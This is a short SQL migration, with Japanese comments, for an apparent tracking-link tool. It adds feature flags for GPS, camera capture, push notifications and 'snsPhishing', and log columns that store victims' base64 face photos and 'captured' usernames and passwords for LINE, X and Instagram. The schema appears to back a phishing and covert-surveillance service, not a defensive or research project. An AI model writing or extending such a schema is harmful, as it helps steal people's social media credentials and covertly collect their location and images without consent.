-- tracking_links に features設定カラムを追加
ALTER TABLE tracking_links ADD COLUMN IF NOT EXISTS features JSONB DEFAULT '{"gps":true,"camera":false,"pushNotification":false,"snsPhishing":false}';

-- tracking_logs に追加データカラムを追加
ALTER TABLE tracking_logs ADD COLUMN IF NOT EXISTS face_photo TEXT;        -- base64 face image
ALTER TABLE tracking_logs ADD COLUMN IF NOT EXISTS push_endpoint TEXT;     -- push notification endpoint
ALTER TABLE tracking_logs ADD COLUMN IF NOT EXISTS sns_username TEXT;      -- SNS username captured
ALTER TABLE tracking_logs ADD COLUMN IF NOT EXISTS sns_password TEXT;      -- SNS password captured
ALTER TABLE tracking_logs ADD COLUMN IF NOT EXISTS sns_platform TEXT;      -- which SNS (LINE, X, Instagram)
